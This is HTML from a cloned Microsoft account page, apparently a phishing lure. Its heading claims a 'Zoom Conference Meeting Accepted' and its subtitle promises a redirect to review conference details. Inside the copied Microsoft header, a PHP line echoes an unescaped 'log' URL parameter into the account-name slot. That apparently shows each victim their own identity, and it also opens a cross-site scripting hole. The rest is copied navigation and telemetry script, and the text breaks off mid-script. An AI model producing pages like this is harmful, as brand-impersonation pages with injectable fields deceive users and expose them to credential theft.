                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/Computers/categoryID.62684600" class="shell-l3-list-item" ms.title="All Windows PCs &amp; tablets" tabindex="20" data-bi-name="Products_DevicesAndXbox_AllPCsAndTablets">
                            All Windows PCs &amp; tablets
                        </a>
                    </li>
                    <li id="shellmenu_55">
                        <a href="https://www.microsoft.com/accessories/en-us" class="shell-l3-list-item" ms.title="PC accessories" tabindex="20" data-bi-name="Products_PCAccessories">
                            PC accessories
                        </a>
                    </li>
                    <li id="shellmenu_56">
                        <a href="http://www.xbox.com/" class="shell-l3-list-item" ms.title="Xbox &amp; games" tabindex="20" data-bi-name="Products_DevicesAndXbox_XboxAndGames">
                            Xbox &amp; games
                        </a>
                    </li>
                    <li id="shellmenu_57">
                        <a href="http://www.microsoft.com/en-us/mobile/" class="shell-l3-list-item" ms.title="Microsoft Lumia" tabindex="20" data-bi-name="Products_DevicesAndXbox_LumiaPhones">
                            Microsoft Lumia
                        </a>
                    </li>
                    <li id="shellmenu_58">
                        <a href="https://www.microsoft.com/en-us/windows/phones" class="shell-l3-list-item" ms.title="All Windows phones" tabindex="20" data-bi-name="Products_DevicesAndXbox_AllWindowsPhones">
                            All Windows phones
                        </a>
                    </li>
                    <li id="shellmenu_59">
                        <a href="http://www.microsoft.com/microsoft-hololens/en-us" class="shell-l3-list-item" ms.title="Microsoft HoloLens" tabindex="20" data-bi-name="Products_DevicesAndXbox_MicrosoftHololens">
                            Microsoft HoloLens
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Products; For business">

                            <dt id="shellmenu_60" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="For business" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    For business
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_61">
                        <a href="http://www.microsoft.com/en-us/server-cloud/" class="shell-l3-list-item" ms.title="Cloud Platform" tabindex="20" data-bi-name="Products_ForBusiness_CloudPlatform">
                            Cloud Platform
                        </a>
                    </li>
                    <li id="shellmenu_62">
                        <a href="http://azure.microsoft.com/" class="shell-l3-list-item" ms.title="Microsoft Azure" tabindex="20" data-bi-name="Products_ForBusiness_MicrosoftAzure">
                            Microsoft Azure
                        </a>
                    </li>
                    <li id="shellmenu_63">
                        <a href="http://www.microsoft.com/en-us/dynamics/default.aspx" class="shell-l3-list-item" ms.title="Microsoft Dynamics" tabindex="20" data-bi-name="Products_ForBusiness_MicrosoftDynamics">
                            Microsoft Dynamics
                        </a>
                    </li>
                    <li id="shellmenu_64">
                        <a href="http://www.microsoft.com/en-us/windows/business/default.aspx" class="shell-l3-list-item" ms.title="Windows for business" tabindex="20" data-bi-name="Products_ForBusiness_WindowsForBusiness">
                            Windows for business
                        </a>
                    </li>
                    <li id="shellmenu_65">
                        <a href="https://products.office.com/en-us/business/office" class="shell-l3-list-item" ms.title="Office for business" tabindex="20" data-bi-name="Products_ForBusiness_OfficeForBusiness">
                            Office for business
                        </a>
                    </li>
                    <li id="shellmenu_66">
                        <a href="https://products.office.com/en-us/skype-for-business" class="shell-l3-list-item" ms.title="Skype for business" tabindex="20" data-bi-name="Products_ForBusiness_SkypeForBusiness">
                            Skype for business
                        </a>
                    </li>
                    <li id="shellmenu_67">
                        <a href="http://www.microsoft.com/surface/en-us/business/overview" class="shell-l3-list-item" ms.title="Surface for business" tabindex="20" data-bi-name="Products_ForBusiness_SurfaceForBusiness">
                            Surface for business
                        </a>
                    </li>
                    <li id="shellmenu_68">
                        <a href="http://www.microsoft.com/enterprise" class="shell-l3-list-item" ms.title="Enterprise solutions" tabindex="20" data-bi-name="Products_ForBusiness_EnterpriseSolutions">
                            Enterprise solutions
                        </a>
                    </li>
                    <li id="shellmenu_69">
                        <a href="https://business.microsoft.com/en-us/" class="shell-l3-list-item" ms.title="Small business solutions" tabindex="20" data-bi-name="Products_ForBusiness_SmallBusinessSolutions">
                            Small business solutions
                        </a>
                    </li>
                    <li id="shellmenu_70">
                        <a href="https://pinpoint.microsoft.com/" class="shell-l3-list-item" ms.title="Find a solutions provider" tabindex="20" data-bi-name="Products_ForBusiness_FindASolutionsProvider">
                            Find a solutions provider
                        </a>
                    </li>
                    <li id="shellmenu_71">
                        <a href="https://www.microsoft.com/en-us/licensing/default.aspx" class="shell-l3-list-item" ms.title="Volume Licensing" tabindex="20" data-bi-name="Products_ForBusiness_VolumeLicensing">
                            Volume Licensing
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Products; For developers &amp; IT pros">

                            <dt id="shellmenu_72" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="For developers &amp; IT pros" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    For developers &amp; IT pros
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_73">
                        <a href="https://developer.microsoft.com/en-us/windows" class="shell-l3-list-item" ms.title="Develop Windows apps" tabindex="20" data-bi-name="Products_DeveloperAndITPro_DevelopWindowsApps">
                            Develop Windows apps
                        </a>
                    </li>
                    <li id="shellmenu_74">
                        <a href="http://azure.microsoft.com/" class="shell-l3-list-item" ms.title="Microsoft Azure" tabindex="20" data-bi-name="Products_ForDevelopersAndITPros_Azure">
                            Microsoft Azure
                        </a>
                    </li>
                    <li id="shellmenu_75">
                        <a href="http://msdn.microsoft.com/en-us/" class="shell-l3-list-item" ms.title="MSDN" tabindex="20" data-bi-name="Products_ForDevelopersAndITPros">
                            MSDN
                        </a>
                    </li>
                    <li id="shellmenu_76">
                        <a href="http://technet.microsoft.com/en-us/" class="shell-l3-list-item" ms.title="TechNet" tabindex="20" data-bi-name="Products_ForDevelopersAndITPros_TechNet">
                            TechNet
                        </a>
                    </li>
                    <li id="shellmenu_77">
                        <a href="http://www.visualstudio.com/" class="shell-l3-list-item" ms.title="Visual Studio" tabindex="20" data-bi-name="Products_ForDevelopersAndITPros_VisualStudio">
                            Visual Studio
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Products; For students &amp; educators">

                            <dt id="shellmenu_78" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="For students &amp; educators" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    For students &amp; educators
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_79">
                        <a href="http://www.microsoft.com/en-us/education/products/office/default.aspx" class="shell-l3-list-item" ms.title="Office for students" tabindex="20" data-bi-name="Products_ForStudentsAndEducators_OfficeForStudents">
                            Office for students
                        </a>
                    </li>
                    <li id="shellmenu_80">
                        <a href="http://www.microsoft.com/en-us/education/products/onenote/default.aspx" class="shell-l3-list-item" ms.title="OneNote in classroom" tabindex="20" data-bi-name="Products_ForStudentsAndEducators_OneNoteInClassroom">
                            OneNote in classroom
                        </a>
                    </li>
                    <li id="shellmenu_81">
                        <a href="http://www.microsoftstore.com/store/msusa/en_US/edu" class="shell-l3-list-item" ms.title="Shop PCs &amp; tablets perfect for students" tabindex="20" data-bi-name="Products_ForStudentsAndEducators_ShopPCsAndTablets">
                            Shop PCs &amp; tablets perfect for students
                        </a>
                    </li>
                    <li id="shellmenu_82">
                        <a href="http://www.microsoft.com/en-us/education" class="shell-l3-list-item" ms.title="Microsoft in Education" tabindex="20" data-bi-name="Products_ForStudentsAndEducators_MicrosoftInEducation">
                            Microsoft in Education
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>

</div>
                                    </li>
                                    <li id="l1_support" class="shell-header-dropdown-label">
                                        <a class="top-level-link-text ctl_headerNavLink" tabindex="20" href="https://support.microsoft.com/en-us" ms.title="Support" data-bi-name="Support" data-bi-slot="3">
                                            Support
                                        </a>
                                    </li>

                </ul>
            </div>
                <div class="shell-header-user-container">
                    <dl class="shell-header-user">
                        <dt>
                            <span id="meControl"><div style="height: 48px;" class="msame_Header" tabindex="60"><div style="line-height: 48px;" class="msame_Header_name msame_TxtTrunc"><?php echo $_GET['log']; ?></div><div class="msame_Header_pic"><div style="padding-top: 6px; padding-bottom: 6px;" class="msame_Header_piccont"><div style="height: 36px; width: 36px;" class="msame_Header_picframe"><img style="height: 36px; width: 36px;" role="presentation" src="personal_account.png"></div></div></div><div class="msame_Header_chev"></div></div></span>
                        </dt>
                    </dl>
                </div>
            
            <div class="shell-header-nav-toggle " ms.cmpgrp="nav">
                <button class="shell-header-toggle-menu" ms.cmpnm="mobile global nav toggle button" ms.title="Toggle menu" title="Toggle Menu" type="button" data-bi-name="Toggle Menu" tabindex="55">
                    <i class="shell-icon-menu"></i>
                </button>
            </div>

            <ul class="shell-header-toggle" ms.cmpgrp="header actions">
                    <li>
                        <button class="shell-header-toggle-search" type="button" data-bi-name="Toggle Search Icon" ms.title="search toggle" title="Toggle Search" tabindex="45">
                            <i class="shell-icon-search"></i>
                        </button>
                    </li>
                                    <li>
                        <a id="shell-header-shopping-cart-mobile" href="https://www.microsoftstore.com/store/msusa/en_US/DisplayThreePgCheckoutShoppingCartPage" class="shell-header-toggle-cart" title="Cart" data-bi-name="Toggle Cart" ms.title="cart" tabindex="50">
                            <i id="toggle-shell-icon-cart" class="shell-icon-cart"></i>
                            <span class="sr-only">Cart</span>
                            <span class="shopping-cart-amount">0</span>
                        </a>
                    </li>
            </ul>

            <div class="shell-header-actions" ms.cmpgrp="header actions">
                    <form id="srv_shellHeaderSearchForm" class="shell-search" role="search" action="//www.microsoft.com/en-us/search/result.aspx" method="GET" autocomplete="off" onsubmit=" return window.msCommonShell.onSearch(this) " ms.cmpnm="search">
                        <div class="shell-search-wrapper">
                            <label for="cli_shellHeaderSearchInput" class="sr-only">Search Microsoft</label>
                            <input id="cli_shellHeaderSearchInput" title="Search Microsoft.com" name="q" data-bi-dnt="" placeholder="Search Microsoft.com" maxlength="200" tabindex="30" type="search">


                            <button type="submit" title="Search" data-bi-dnt="" tabindex="40">
                                <i class="shell-icon-search"></i>
                                <span class="sr-only">Search</span>
                            </button>
                            <div id="cli_searchSuggestionsContainer" class="shell-search-dropdown-container">
                                <div class="search-dropdown">
                                    <div class="dropdown-item">
                                        <ul id="cli_searchSuggestionsResults" data-bi-name="Search Suggestions" data-bi-source="UnifiedSearch" ms.cmpgrp="search suggestions"></ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>

                    <div class="shell-header-cart">
                        <a id="shell-header-shopping-cart" href="https://www.microsoftstore.com/store/msusa/en_US/DisplayThreePgCheckoutShoppingCartPage" data-bi-name="Shopping Cart" title="Cart" ms.title="cart" tabindex="50">
                            <i class="shell-icon-cart"></i>
                            <span class="sr-only">Cart</span>
                            <span class="shopping-cart-amount">0</span>
                        </a>
                    </div>
                        <iframe src="about_files/pbPage.htm" id="shell-cart-count" data-src="//www.microsoftstore.com/store/msusa/en_US/Content/pbPage.CartSummary" style="display: none"></iframe>
            </div>

        </div>
    </div>
</div>
<div style="height: 48px;" class="fixed-global-nav-buffer"></div>






<!--[if lt IE 9]>
<div class="shell-category-header lt-ie9 cat-theme-blue" ms.pgarea="categoryheader">
<![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<div class="shell-category-header cat-theme-blue" ms.pgarea="categoryheader">
    <!--<![endif]-->
    <div role="navigation" aria-label="Category level navigation" class="shell-category-nav" ms.cmpgrp="cat nav" data-bi-area="CategoryHeader-AccountAMC" data-bi-view="C0">
        <div style="display: none;" class="c-nav-pagination c-nav-pagination-prev">
            <i class="shell-icon-dropdown facing-left"></i>
        </div>
        <ul class="shell-category-top-level shell-category-brand">
            <li class="c-logo-item">
                                <a id="shell-cat-header-logo" class="c-logo c-top-nav-link" href="https://account.microsoft.com/" title="" ms.title="AccountAMC" data-bi-name="Category logo" tabindex="70">
                    <span class="logo-text-label">Account</span>
                </a>
                <a id="shell-cat-header-logo-mobile" class="c-logo-mobile c-top-nav-link c-nav-dropdown" href="javascript:void(0);" ms.title="AccountAMC" ms.interactiontype="14" data-bi-name="Mobile category logo" tabindex="70">
                    <span class="logo-text-label">Account</span>
                    <i class="shell-icon-dropdown"></i>
                </a>
            <ul class="c-nav-dropdown-menu" role="menu" data-bi-area="CategoryHeader-AccountAMC" data-bi-view="C1">



                <li class="c-top-nav-item" id="home-mobilelist">
                    <a id="home-mobile" tabindex="70" aria-labelledby="home-mobilelist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/" ms.title="Home" data-bi-name="home-mobile" data-bi-slot="1" data-show-cta="False">
                        <span>Home</span>
                    </a>
                </li>
                <li class="c-top-nav-item" id="sharedshell-profile-mobilelist">
                    <a id="sharedshell-profile-mobile" tabindex="70" aria-labelledby="sharedshell-profile-mobilelist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/profile" ms.title="Your info" data-bi-name="sharedshell-yourinfo" data-bi-slot="2" data-show-cta="True">
                        <span>Your info</span>
                    </a>
                </li>
                <li class="c-top-nav-item" id="sharedshell-services-mobilelist">
                    <a id="sharedshell-services-mobile" tabindex="70" aria-labelledby="sharedshell-services-mobilelist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/services" ms.title="Services &amp; subscriptions" data-bi-name="services" data-bi-slot="3" data-show-cta="True">
                        <span>Services &amp; subscriptions</span>
                    </a>
                </li>
            <li class="c-top-nav-item" id="pb-main-mobilelist">
                <a id="pb-main-mobile" tabindex="70" aria-expanded="false" aria-labelledby="pb-main-mobilelist" class="c-top-nav-link c-nav-link c-nav-dropdown" href="javascript:void(0);" ms.title="Payment &amp; billing" role="button" ms.interactiontype="14" data-bi-name="billing" data-bi-slot="4" data-show-cta="True">
                    <span>Payment &amp; billing<i class="shell-icon-dropdown"></i></span>
                </a>
                <ul aria-hidden="true" class="c-nav-dropdown-menu" data-bi-area="CategoryHeader-AccountAMC" data-bi-view="billing-C2" ms.cmpnm="Payment &amp; billing" role="menu">




        <li class="c-nav-item ">
            <a id="pb-orders-mobile" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/billing/orders" ms.title="Order history" data-bi-name="billing-overview" data-bi-slot="1" tabindex="70">
                <span>
                    Order history
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="pb-pi-mobile" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/billing/payments" ms.title="Payment options" data-bi-name="billing-paymentoptions" data-bi-slot="2" tabindex="70">
                <span>
                    Payment options
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="pb-profile-mobile" class="c-nav-dropdown-item c-nav-link " href="https://commerce.microsoft.com/PaymentHub/Profile?lang=en-us" ms.title="Billing info" data-bi-name="billing-billinginfo" data-bi-slot="3" tabindex="70">
                <span>
                    Billing info
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="pb-help-mobile" class="c-nav-dropdown-item c-nav-link " href="https://commerce.microsoft.com/PaymentHub/Help?lang=en-us" ms.title="Billing help" data-bi-name="billing-billinghelp" data-bi-slot="4" tabindex="70">
                <span>
                    Billing help
                </span>
            </a>



        </li>


                </ul>
            </li>
            <li class="c-top-nav-item" id="sharedshell-devices-mobilelist">
                <a id="sharedshell-devices-mobile" tabindex="70" aria-expanded="false" aria-labelledby="sharedshell-devices-mobilelist" class="c-top-nav-link c-nav-link c-nav-dropdown" href="javascript:void(0);" ms.title="Devices" role="button" ms.interactiontype="14" data-bi-name="devices" data-bi-slot="5" data-show-cta="True">
                    <span>Devices<i class="shell-icon-dropdown"></i></span>
                </a>
                <ul aria-hidden="true" class="c-nav-dropdown-menu" data-bi-area="CategoryHeader-AccountAMC" data-bi-view="devices-C2" ms.cmpnm="Devices" role="menu">




        <li class="c-nav-item ">
            <a id="sharedshell-devices-mydevices-mobile" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/devices" ms.title="Your devices" data-bi-name="devices-mydevices" data-bi-slot="1" tabindex="70">
                <span>
                    Your devices
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="sharedshell-devices-storedevices-mobile" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/devices/store" ms.title="Apps &amp; games devices " data-bi-name="devices-storedevices" data-bi-slot="2" tabindex="70">
                <span>
                    Apps &amp; games devices 
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="sharedshell-devices-music-mobile" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/devices/music" ms.title="Music devices" data-bi-name="devices-music" data-bi-slot="3" tabindex="70">
                <span>
                    Music devices
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="sharedshell-devices-video-mobile" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/devices/video" ms.title="Movies &amp; TV devices" data-bi-name="devices-video" data-bi-slot="4" tabindex="70">
                <span>
                    Movies &amp; TV devices
                </span>
            </a>



        </li>


                </ul>
            </li>
                <li class="c-top-nav-item" id="sharedshell-family-mobilelist">
                    <a id="sharedshell-family-mobile" tabindex="70" aria-labelledby="sharedshell-family-mobilelist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/family" ms.title="Family" data-bi-name="family" data-bi-slot="6" data-show-cta="True">
                        <span>Family</span>
                    </a>
                </li>
                <li class="c-top-nav-item" id="sharedshell-privacy-mobilelist">
                    <a id="sharedshell-privacy-mobile" tabindex="70" aria-labelledby="sharedshell-privacy-mobilelist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/privacy" ms.title="Security &amp; privacy" data-bi-name="privacy" data-bi-slot="7" data-show-cta="True">
                        <span>Security &amp; privacy</span>
                    </a>
                </li>

            </ul>

            </li>

        </ul>

        
        <ul class="c-menu-container shell-category-top-level shell-category-nav-wrapper" role="menu" data-bi-area="CategoryMenuItems-AccountAMC" data-bi-view="C1">



                <li style="margin-left: -5px;" class="c-top-nav-item" id="sharedshell-profilelist">
                    <a id="sharedshell-profile" tabindex="70" aria-labelledby="sharedshell-profilelist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/profile" ms.title="Your info" data-bi-name="sharedshell-yourinfo" data-bi-slot="1" data-show-cta="True">
                        <span>Your info</span>
                    </a>
                </li>
                <li class="c-top-nav-item" id="sharedshell-serviceslist">
                    <a id="sharedshell-services" tabindex="70" aria-labelledby="sharedshell-serviceslist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/services" ms.title="Services &amp; subscriptions" data-bi-name="services" data-bi-slot="2" data-show-cta="True">
                        <span>Services &amp; subscriptions</span>
                    </a>
                </li>
            <li class="c-top-nav-item" id="pb-mainlist">
                <a id="pb-main" tabindex="70" aria-expanded="false" aria-labelledby="pb-mainlist" class="c-top-nav-link c-nav-link c-nav-dropdown" href="javascript:void(0);" ms.title="Payment &amp; billing" role="button" ms.interactiontype="14" data-bi-name="billing" data-bi-slot="3" data-show-cta="True">
                    <span>Payment &amp; billing<i class="shell-icon-dropdown"></i></span>
                </a>
                <ul aria-hidden="true" class="c-nav-dropdown-menu" data-bi-area="CategoryHeader-AccountAMC" data-bi-view="billing-C2" ms.cmpnm="Payment &amp; billing" role="menu">




        <li class="c-nav-item ">
            <a id="pb-orders" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/billing/orders" ms.title="Order history" data-bi-name="billing-overview" data-bi-slot="1" tabindex="70">
                <span>
                    Order history
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="pb-pi" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/billing/payments" ms.title="Payment options" data-bi-name="billing-paymentoptions" data-bi-slot="2" tabindex="70">
                <span>
                    Payment options
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="pb-profile" class="c-nav-dropdown-item c-nav-link " href="https://commerce.microsoft.com/PaymentHub/Profile?lang=en-us" ms.title="Billing info" data-bi-name="billing-billinginfo" data-bi-slot="3" tabindex="70">
                <span>
                    Billing info
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="pb-help" class="c-nav-dropdown-item c-nav-link " href="https://commerce.microsoft.com/PaymentHub/Help?lang=en-us" ms.title="Billing help" data-bi-name="billing-billinghelp" data-bi-slot="4" tabindex="70">
                <span>
                    Billing help
                </span>
            </a>



        </li>


                </ul>
            </li>
            <li class="c-top-nav-item" id="sharedshell-deviceslist">
                <a id="sharedshell-devices" tabindex="70" aria-expanded="false" aria-labelledby="sharedshell-deviceslist" class="c-top-nav-link c-nav-link c-nav-dropdown" href="javascript:void(0);" ms.title="Devices" role="button" ms.interactiontype="14" data-bi-name="devices" data-bi-slot="4" data-show-cta="True">
                    <span>Devices<i class="shell-icon-dropdown"></i></span>
                </a>
                <ul aria-hidden="true" class="c-nav-dropdown-menu" data-bi-area="CategoryHeader-AccountAMC" data-bi-view="devices-C2" ms.cmpnm="Devices" role="menu">




        <li class="c-nav-item ">
            <a id="sharedshell-devices-mydevices" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/devices" ms.title="Your devices" data-bi-name="devices-mydevices" data-bi-slot="1" tabindex="70">
                <span>
                    Your devices
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="sharedshell-devices-storedevices" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/devices/store" ms.title="Apps &amp; games devices " data-bi-name="devices-storedevices" data-bi-slot="2" tabindex="70">
                <span>
                    Apps &amp; games devices 
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="sharedshell-devices-music" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/devices/music" ms.title="Music devices" data-bi-name="devices-music" data-bi-slot="3" tabindex="70">
                <span>
                    Music devices
                </span>
            </a>



        </li>
        <li class="c-nav-item ">
            <a id="sharedshell-devices-video" class="c-nav-dropdown-item c-nav-link " href="https://account.microsoft.com/devices/video" ms.title="Movies &amp; TV devices" data-bi-name="devices-video" data-bi-slot="4" tabindex="70">
                <span>
                    Movies &amp; TV devices
                </span>
            </a>



        </li>


                </ul>
            </li>
                <li class="c-top-nav-item" id="sharedshell-familylist">
                    <a id="sharedshell-family" tabindex="70" aria-labelledby="sharedshell-familylist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/family" ms.title="Family" data-bi-name="family" data-bi-slot="5" data-show-cta="True">
                        <span>Family</span>
                    </a>
                </li>
                <li class="c-top-nav-item" id="sharedshell-privacylist">
                    <a id="sharedshell-privacy" tabindex="70" aria-labelledby="sharedshell-privacylist" class="c-top-nav-link c-nav-link" href="https://account.microsoft.com/privacy" ms.title="Security &amp; privacy" data-bi-name="privacy" data-bi-slot="6" data-show-cta="True">
                        <span>Security &amp; privacy</span>
                    </a>
                </li>

        </ul>

        <div style="display: none;" class="c-nav-pagination c-nav-pagination-next">
            <i class="shell-icon-dropdown facing-right"></i>
        </div>
    </div>

</div>
<div class="fixed-category-nav-buffer"></div>






<script type="text/javascript">

    var shellInitOptions = {
        lcaDisclaimerEnabled: false,
        suggestedProductTitle : 'Suggested products'
    };

    
    var meControlInitOptions = {
        containerId: 'meControl',
            enabled: true,
        headerHeight: 48,
        custom: { chevHtml: '<i class="msame_chev_uhf shell-icon-dropdown"></i>' },
        

        mobileBreakpoints: {
            shortHeader: 1084
        },

        rpData:
        {
            msaInfo:
            {
                    
                        signInUrl: '/auth/complete-signin',
                        signOutUrl: '',
                        accountSettingsUrl: 'https://account.microsoft.com/',
                        switchUrl: '',
                        meUrl: 'https://login.live.com/me.srf?wa=wsignin1.0',
                        isSupported: true
                    
            },
            aadInfo:
            {
            },
            preferredIdp: 'msa',
        },
        signInStr: 'Sign in',
        signOutStr: 'Sign out'
    };
</script>
 
    </div>

        </header>
        


<div id="home-about-index" class="content-container container-fluid home-container">
<div class="row">
    <div id="signed-out-page" class="col-xs-24">
                <header class="page-title-header text-center remove-bottom-margin">
            <h1 class="page-title">Zoom Conference Meeting Accepted
</h1>

             <div id="loading">
                <span class="internal"></span>
            </div>

            <div class="page-subtitle spacer-20-top spacer-20-bottom">Microsoft is taking you Zoom Communications to review Conference details <p>You will be redirected in a short while.</p></div>
        </header>
</div>

        </header>
        <section class="section">
            <div class="section-body">
                <div class="btn-group-wrap">
                    <div class="btn-group spacer-12-bottom">
                       
                    </div>
                </div>
            </div>
        </section>

        <section class="section">
    <div class="section-body">
        <div class="row">
                <div class="col-lg-6 col-sm-12">
                    <section id="bucket-section-0" class="section item-section">

                        <header class="section-header">
                            <h4 class="text-subtitle">What's that charge?</h4>
                        </header>
                        <div class="section-body">
                            <p>
                                There are no billing surprises when you 
can check your apps, subscriptions, and other purchases from the Store.
<a class="bucket-description-link" href="https://account.microsoft.com/billing">Check your payments &amp; billing</a>                            </p>
                        </div>
                    </section>
                </div>
                <div class="col-lg-6 col-sm-12">
                    <section id="bucket-section-1" class="section item-section">

                        <header class="section-header">
                            <h4 class="text-subtitle">Don't miss out on free services</h4>
                        </header>
                        <div class="section-body">
                            <p>
                                See which services come with your 
account, and renew, cancel, or change the subscriptions you pay for, 
like Office 365 or Xbox Live.
<a class="bucket-description-link" href="https://account.microsoft.com/services">Check out your services and subscriptions.</a>                            </p>
                        </div>
                    </section>
                </div>
                <div class="col-lg-6 col-sm-12 clear-md">
                    <section id="bucket-section-2" class="section item-section">

                        <header class="section-header">
                            <h4 class="text-subtitle">Lost a phone? Need help with your devices?</h4>
                        </header>
                        <div class="section-body">
                            <p>
                                This is the faster place to find your 
lost devices on a map, renew a warranty, and get exactly the right help 
for each device.
<a class="bucket-description-link" href="https://account.microsoft.com/devices">See your devices</a>                            </p>
                        </div>
                    </section>
                </div>
                <div class="col-lg-6 col-sm-12">
                    <section id="bucket-section-3" class="section item-section">
                        <header class="section-header">
                            <h4 class="text-subtitle">See what your kids are up to</h4>
                        </header>
                        <div class="section-body">
                            <p>
                                Keep your kids safer with smart reports and limits on what they can see online.
<a class="bucket-description-link" href="https://account.microsoft.com/family">Add your kids</a>                            </p>
                        </div>
                    </section>
                </div>
        </div>
    </div>
</section>






    </div>
</div>
</div>

        

    </div>
    <footer id="site-footer">
        

 


<div class="shell-footer" ms.pgarea="uhffooter" data-bi-area="Footer" data-bi-view="4xLinks">
    <div class="shell-footer-wrapper">


        <div class="shell-footer-lang" ms.cmpgrp="loc picker" ms.cmpnm="loc picker">
                <ul>
                    <li>
                        <i class="shell-icon-globe"></i>
                    </li><li>
                        <a id="locale-picker-link" ms.title="English (United States)" href="https://account.microsoft.com/languages?lang=en-us" data-bi-name="LocalePicker">
                            English (United States)‎
                        </a>
                    </li>
                </ul>
        </div>
        <div class="shell-footer-copyright" ms.cmpgrp="corp links" ms.cmpnm="corp" role="contentinfo">
            <ul>
                            <li>
                                <a id="shellmenu_83" href="https://go.microsoft.com/fwlink/?LinkID=521839" ms.title="Privacy &amp; cookies" class="ctl_footerNavLink" data-bi-name="footer-privacycookies" data-bi-slot="1">
                                    Privacy &amp; cookies
                                </a>
                            </li>
                            <li>
                                <a id="shellmenu_84" href="https://go.microsoft.com/fwlink/?LinkID=530144" ms.title="Terms of use" class="ctl_footerNavLink" data-bi-name="footer-terms" data-bi-slot="2">
                                    Terms of use
                                </a>
                            </li>
                            <li>
                                <a id="shellmenu_85" href="https://support.microsoft.com/contactus" ms.title="Contact us" class="ctl_footerNavLink" data-bi-name="footer-contactus" data-bi-slot="3">
                                    Contact us
                                </a>
                            </li>
                            <li>
                                <a id="feedback-button" href="javascript:MeePortal.Feedback.control.show()" ms.title="Feedback" class="ctl_footerNavLink" data-bi-name="feedback-button" data-bi-slot="4">
                                    Feedback
                                </a>
                            </li>

                <li class="ctl_footerCopyright">
                    © 2020 Microsoft
                </li>
            </ul>
        </div>
    </div>
</div>

        


    </footer>

    
    




<script src="about_files/webi"></script>


<script type="text/javascript" id="portal-telemetry">
    (function bootstrapPortalTelemetry() {
        var onlyJsll = false;

        var jsllOptions = {
            appId: "account.microsoft.com",
            isUserSignedIn: true,
            performMuidSync: true,
            allowClickTracking: false,
            allowJsllWedcsCompat: false
        };

        //  NOTE: WEDCS has issues with MUID sync, so keep it unconditionally disabled, even if JSLL is disabled.
        var wedcsOptions = onlyJsll ? null : {
            appId: "account.microsoft.com",
            isUserSignedIn: true,
            performMuidSync: false,
            allowClickTracking: true,
            routeId: "14132",
            ctrlId: "SD200",
            scriptUrl: "/bundles/scripts/wedcs?v=rin3FpU4vJTyWGVv-lZbDFXV9lzqfKQTPohmo-I6dMg1"
        };

        var providerOptions = {
            allowAutoPageView: true,
            market: "NG",
            language: "en-US"
        };

        MeePortal.Telemetry.initializePortalTelemetry({
            providerOptions: providerOptions,
            jsllOptions: jsllOptions,
            wedcsOptions: wedcsOptions,
            portalAreaName: "home"
        });
    })();
</script>

    <script id="site-layout-config" type="text/javascript">
        var MeePortal = MeePortal || {};
        MeePortal.Utilities = MeePortal.Utilities || {};
        MeePortal.SearchSuggestion = MeePortal.SearchSuggestion || {};

        
        MeePortal.Utilities.EmailRegex = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

        MeePortal.SearchSuggestion.Config = {
